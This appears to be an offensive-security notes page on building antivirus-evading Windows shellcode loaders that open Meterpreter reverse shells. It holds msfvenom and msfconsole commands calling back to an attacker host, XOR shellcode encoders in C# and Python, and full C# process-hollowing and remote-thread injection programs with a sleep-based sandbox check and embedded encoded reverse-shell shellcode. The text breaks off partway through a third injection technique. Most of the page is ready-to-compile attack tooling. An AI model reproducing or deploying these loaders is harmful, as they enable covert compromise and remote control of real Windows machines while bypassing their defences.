---
title: Upgrading Shells
sidebar_position: 7
---

### **General Steps**

**Theory** For all the following sections the steps are the same, these are to be compiled and serve as `.exe` to get a Meterpreter reverse shell, remember that you can change the payload, for these purposes we use Meterpreter but you can use any payload you want, every exploit implement a different attempt to bypass and execute to avoid AV Detection; however the general steps are almost the same for all of them:

**Steps**

1. **Craft your payload**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=[ATTACKER_IP] LPORT=443 -f csharp

msfvenom -p windows/x64/meterpreter/reverse_https exitfunc=thread LHOST=[ATTACKER_IP] LPORT=443 -f csharp

```

1. **Encrypt the shellcode with XOR and key `0xfa`**, you can either use the below code that you have to compile in Visual Studio and will give you the code, or you can use `XOREncoder.exe` (Utilities Section) that is an application already compiled that will give the code, or you can also use the Python script below as well

```csharp
// C# Visual Studio - Console App (.NET)
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XorCoder
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[511] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            ...,
            0xd5 };

            // Encode the payload with XOR (fixed key)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex;

            if (args.Length > 0)
            {
                switch (args[0])
                {
                    case "-VBA":
                        // Printout VBA payload
                        uint counter = 0;

                        hex = new StringBuilder(encoded.Length * 2);
                        foreach (byte b in encoded)
                        {
                            hex.AppendFormat("{0:D3}, ", b);
                            counter++;
                            if (counter % 25 == 0)
                            {
                                hex.Append("_\n");
                            }
                        }
                        Console.WriteLine($"XORed VBA payload (key: 0xfa):");
                        Console.WriteLine(hex.ToString());
                        break;
                    default:
                        Console.WriteLine("Accepted arguments: -VBA to print VBA payload instead of C#");
                        break;
                }
            }
            else
            {
                // Printout C# payload
                hex = new StringBuilder(encoded.Length * 2);
                int totalCount = encoded.Length;
                for (int count = 0; count < totalCount; count++)
                {
                    byte b = encoded[count];

                    if ((count + 1) == totalCount) // Dont append comma for last item
                    {
                        hex.AppendFormat("0x{0:x2}", b);
                    }
                    else
                    {
                        hex.AppendFormat("0x{0:x2}, ", b);
                    }

                    if ((count + 1) % 15 == 0)
                    {
                        hex.Append("\n");
                    }
                }

                Console.WriteLine($"XORed C# payload (key: 0xfa):");
                Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
            }

            // Decode the XOR payload
            /*
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            */

        }
    }
}

```

```python
#!/usr/bin/python3

# Basic shellcode crypter for C# payloads
# By Cas van Cooten

import re
import platform
import argparse
import subprocess
from random import randint

if platform.system() != "Linux":
    exit("[x] ERROR: Only Linux is supported for this utility script.")

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Parse input arguments
def auto_int(x):
    return int(x, 0)

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use")
parser.add_argument("format", help="the language to format the output in ('cs' or 'cpp')", nargs='?', default="cs")
parser.add_argument("encoding", help="the encoding type to use ('xor' or 'rot')", nargs='?', default="xor")
parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_tcp)", nargs='?', default="windows/x64/meterpreter/reverse_tcp")
args = parser.parse_args()

# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE)

if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")

# Get the payload bytes and split them
payload = re.search(r"{([^}]+)}", result.stdout.decode("utf-8")).group(1).replace('\n', '').split(",")

# Format the output payload
if args.format == "cs":
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    for i, byte in enumerate(payload):
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        payload[i] = "{0:#0{1}x}".format(byteInt,4)

    payLen = len(payload)
    payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)
    payloadFormatted = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
    payloadFormatted += f"// {args.encoding}-encoded with key {hex(args.key)}\n"
    payloadFormatted += f"byte[] buf = new byte[{str(payLen)}] {{\n{payload.strip()}\n}};"if payLen > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload written to '/tmp/payload.txt' in CSharp format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload (CSharp):{bcolors.ENDC}")
        print(payloadFormatted + "\n")

    # Provide the decoding function for the heck of it
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)((uint)buf[i] ^ {hex(args.key)});
    }}"""if args.encoding == "rot":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)(((uint)buf[i] - {hex(args.key)}) & 0xFF);
    }}"""print(decodingFunc)

elif args.format == "cpp":
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    encodedPayload = []
    for byte in payload:
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        encodedPayload.append(f"\\x{byteInt:02x}")

    payLen = len(encodedPayload)
    payload = re.sub("(.{64})", "    \"\\1\"\n", ''.join(encodedPayload), 0, re.DOTALL)
    payloadFormatted  = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
    payloadFormatted += f"// {args.encoding}-encoded with key {hex(args.key)}\n"
    payloadFormatted += f"unsigned char buffer[] =\n    {payload.strip()};"if payLen > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload written to '/tmp/payload.txt' in C++ format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload (C++):{bcolors.ENDC}")
        print(payloadFormatted + "\n")

    # Provide the decoding function for the heck of it
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    bufferx[i] = (char)(buffer[i] ^ {hex(args.key)});
        """if args.encoding == "rot":
        decodingFunc = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    bufferx[i] = (char)(buffer[i] - {hex(args.key)} & 255);
        """print(decodingFunc)

else:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid formatting type (choose 'cs' for CSharp or 'cpp' for C++).{bcolors.ENDC}")

```

1. **Choose the type of exploit you need**
    1. **If `.exe`: create a VS Project - Console App (.NET)**, and choose any of the code from the EXE subsection; insert the code in `Program.cs`, remember to change any reference to names than don't match.
    2. **If `.dll`: create a VS Project - Class Library (.NET)**, and choose any of the code from the EXE subsection; insert the code in `Class1.cs`, remember to change any reference to names than don't match.
2. **Compile for Release & x64 (depending on your target architecture)**
3. **Start your listener**

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost [ATTACKER_IP]; set lport 443; exploit"

sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport 443; exploit"

```

1. **(Optional)** Depending on your choose of technique you may need to start a Python Server to server helper utilities

```bash
python3 -m http.server 80

```

### **EXE**

### **Process Hollowing with Sleeper for AV Detection**

**Explanation** This C# program implements **process hollowing via entry-point overwrite** inside a suspended process. It starts a benign process (`svchost.exe`) suspended, walks the target process's PEB to find the loaded image base and the PE header, computes the process entrypoint address (handling ASLR), XOR-decodes an embedded shellcode blob, writes that decoded payload directly over the target process's entrypoint, and then resumes the main thread so the injected payload runs in the context of the host process.

**High-level steps (mapped to the code)**

1. Create the target process in a suspended state using `CreateProcess` (`CREATE_SUSPENDED`).
2. Query the target's PEB to get the image base using `ZwQueryInformationProcess`.
3. Read the on-disk/loaded PE headers from the target with ReadProcessMemory to locate the entrypoint RVA.
4. Compute the absolute entrypoint address by adding the image base + RVA.
5. XOR-decode the embedded shellcode and overwrite the entrypoint with `WriteProcessMemory`.
6. Resume the suspended thread to run the injected payload using `ResumeThread`.

**Code**

```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
            // XORed with key 0xfa
            byte[] buf = new byte[511] {
            0x06, 0xb2, 0x36...
            0x2f
            };

            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");

            // Carrying on, decode the XOR payload
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            Console.WriteLine("XOR-decoded payload.");

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
        }
    }
}

```

### **NativeProcInjection**

**Explanation** This technique demonstrates classic process injection using Native Windows API functions. It creates a remote process (usually `notepad.exe`), allocates memory in it, writes shellcode, and creates a remote thread to execute the payload.

**High-Level Steps:**

1. Obtain a handle to the target process using `NtOpenProcess`.
2. Allocate memory in the remote process with `NtAllocateVirtualMemory`.
3. Write shellcode into the allocated memory using `NtWriteVirtualMemory`.
4. Create a remote thread in the target process using `NtCreateThreadEx` to execute the shellcode.

**Code**

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Inject
{
    class Program
    {
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint MEM_COMMIT = 0x1000;
        private static readonly uint MEM_RESERVE = 0x2000;

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID clientId);

        [DllImport("ntdll.dll")]
        static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);

        [DllImport("ntdll.dll")]
        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

        static void Main(string[] args)
        {

            Process[] targetProcess = Process.GetProcessesByName("explorer");
            IntPtr htargetProcess = targetProcess[0].Handle;

            IntPtr hProcess = IntPtr.Zero;
            CLIENT_ID clientid = new CLIENT_ID();
            clientid.UniqueProcess = new IntPtr(targetProcess[0].Id);
            clientid.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES ObjectAttributes = new OBJECT_ATTRIBUTES();

            uint status = NtOpenProcess(ref hProcess, 0x001F0FFF, ref ObjectAttributes, ref clientid);

            // Generate: msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=eth0 LPORT=443 -f csharp
            // The shellcode XOR'd with key: 0xfa
            byte[] buf = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, ..., 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };

            IntPtr baseAddress = new IntPtr();
            IntPtr regionSize = (IntPtr)buf.Length;

            IntPtr NtAllocResult = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            var localBaseAddrString = string.Format("{0:X}", baseAddress);
            UInt64 localBaseAddrInt = UInt64.Parse(localBaseAddrString);
            string localBaseAddHex = localBaseAddrInt.ToString("x");

            // Decode the payload
            for (int j = 0; j < buf.Length; j++)
            {
                buf[j] = (byte)((uint)buf[j] ^ 0xfa);
            }

            int NtWriteProcess = NtWriteVirtualMemory(hProcess, baseAddress, buf, (uint)buf.Length, out uint wr);

            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;

                    var bufString = string.Format("{0:X}", new IntPtr(p2));
                    UInt64 bufInt = UInt64.Parse(bufString);
                    string bufHex = bufInt.ToString("x");

                }
            }

            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(targetProcess[0].Id).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            IntPtr hRemoteThread;
            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, htargetProcess,(IntPtr)baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

        }
    }
}

```

### **NtMapInjection**

**Explanation** This method utilizes NT native APIs to create a shared memory section and map it into both the local and remote process. It's stealthier than the classic method and avoids using easily-monitored APIs like `WriteProcessMemory`.

**High-Level Steps:**

1. Create a memory section using `NtCreateSection`.
2. Map the section into the local process using `NtMapViewOfSection`.
3. Copy the shellcode into the local view.
4. Map the same section into the remote process using `NtMapViewOfSection`.
5. Create a remote thread in the target process with `CreateRemoteThread` or equivalent to execute the code.

**Code**

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Inject
{
    class Program
    {
        private static readonly uint SECTION_MAP_READ = 0x0004;
        private static readonly uint SECTION_MAP_WRITE = 0x0002;
        private static readonly uint SECTION_MAP_EXECUTE = 0x0008;
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint SEC_COMMIT = 0x8000000;
        private static readonly uint PAGE_READWRITE = 0x04;
        private static readonly uint PAGE_READEXECUTE = 0x20;

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        static void Main(string[] args)
        {

            byte[] buf;
            IntPtr hremoteProcess = default;

            Process[] targetProcess = Process.GetProcessesByName("explorer"); //You can change it.
            hremoteProcess = OpenProcess(0x001F0FFF, false, targetProcess[0].Id);

            IntPtr hlocalProcess = Process.GetCurrentProcess().Handle;

            // x86 Payload: msfvenom -p windows/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            // byte[] bufx64 = new byte[375] { 0x06, 0x12, 0x75, 0xFA, 0xFA, 0xFA, 0x9A, 0xCB, 0x28, 0x73, 0x1F, 0x9E, 0x71, 0xA8, 0xCA, 0x71, 0xA8, 0xF6, 0x71, 0xA8, 0xEE, 0xCB, 0x05, 0x71, 0x88, 0xD2, 0xF5, 0x4D, 0xB0, 0xDC, 0xCB, 0x3A, 0x56, 0xC6, 0x9B, 0x86, 0xF8, 0xD6, 0xDA, 0x3B, 0x35, 0xF7, 0xFB, 0x3D, 0xB3, 0x8F, 0x15, 0xA8, 0xAD, 0x71, 0xA8, 0xEA, 0x71, 0xB8, 0xC6, 0xFB, 0x2A, 0x71, 0xBA, 0x82, 0x7F, 0x3A, 0x8E, 0xB6, 0xFB, 0x2A, 0x71, 0xB2, 0xE2, 0xAA, 0x71, 0xA2, 0xDA, 0xFB, 0x29, 0x7F, 0x33, 0x8E, 0xC6, 0xB3, 0x71, 0xCE, 0x71, 0xCB, 0x05, 0xFB, 0x2C, 0xCB, 0x3A, 0x56, 0x3B, 0x35, 0xF7, 0xFB, 0x3D, 0xC2, 0x1A, 0x8F, 0x0E, 0xF9, 0x87, 0x02, 0xC1, 0x87, 0xDE, 0x8F, 0x1A, 0xA2, 0x71, 0xA2, 0xDE, 0xFB, 0x29, 0x9C, 0x71, 0xF6, 0xB1, 0x71, 0xA2, 0xE6, 0xFB, 0x29, 0x71, 0xFE, 0x71, 0xFB, 0x2A, 0x73, 0xBE, 0xDE, 0xDE, 0xA1, 0xA1, 0x9B, 0xA3, 0xA0, 0xAB, 0x05, 0x1A, 0xA2, 0xA5, 0xA0, 0x71, 0xE8, 0x13, 0x7A, 0x05, 0x05, 0x05, 0xA7, 0x92, 0xC9, 0xC8, 0xFA, 0xFA, 0x92, 0x8D, 0x89, 0xC8, 0xA5, 0xAE, 0x92, 0xB6, 0x8D, 0xDC, 0xFD, 0x73, 0x12, 0x05, 0x2A, 0x42, 0x6A, 0xFB, 0xFA, 0xFA, 0xD3, 0x3E, 0xAE, 0xAA, 0x92, 0xD3, 0x7A, 0x91, 0xFA, 0x05, 0x2F, 0x90, 0xF0, 0x92, 0x3A, 0x52, 0xC8, 0x9F, 0x92, 0xF8, 0xFA, 0xFB, 0x41, 0x73, 0x1C, 0xAA, 0xAA, 0xAA, 0xAA, 0xBA, 0xAA, 0xBA, 0xAA, 0x92, 0x10, 0xF5, 0x25, 0x1A, 0x05, 0x2F, 0x6D, 0x90, 0xEA, 0xAC, 0xAD, 0x92, 0x63, 0x5F, 0x8E, 0x9B, 0x05, 0x2F, 0x7F, 0x3A, 0x8E, 0xF0, 0x05, 0xB4, 0xF2, 0x8F, 0x16, 0x12, 0x9D, 0xFA, 0xFA, 0xFA, 0x90, 0xFA, 0x90, 0xFE, 0xAC, 0xAD, 0x92, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x84, 0xCC, 0x71, 0xCC, 0x90, 0xBA, 0x92, 0xFA, 0xEA, 0xFA, 0xFA, 0xAC, 0x90, 0xFA, 0x92, 0xA2, 0x5E, 0xA9, 0x1F, 0x05, 0x2F, 0x69, 0xA9, 0x90, 0xFA, 0xAC, 0xA9, 0xAD, 0x92, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x87, 0xD2, 0xA2, 0x92, 0xFA, 0xBA, 0xFA, 0xFA, 0x90, 0xFA, 0xAA, 0x92, 0xF1, 0xD5, 0xF5, 0xCA, 0x05, 0x2F, 0xAD, 0x92, 0x8F, 0x94, 0xB7, 0x9B, 0x05, 0x2F, 0xA4, 0xA4, 0x05, 0xF6, 0xDE, 0xF5, 0x7F, 0x8A, 0x05, 0x05, 0x05, 0x13, 0x61, 0x05, 0x05, 0x05, 0xFB, 0x39, 0xD3, 0x3C, 0x8F, 0x3B, 0x39, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0x92, 0x5C, 0x6F, 0x47, 0x67, 0x05, 0x2F, 0xC6, 0xFC, 0x86, 0xF0, 0x7A, 0x01, 0x1A, 0x8F, 0xFF, 0x41, 0xBD, 0xE9, 0x88, 0x95, 0x90, 0xFA, 0xA9, 0x05, 0x2F };

            // x64 Payload: msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
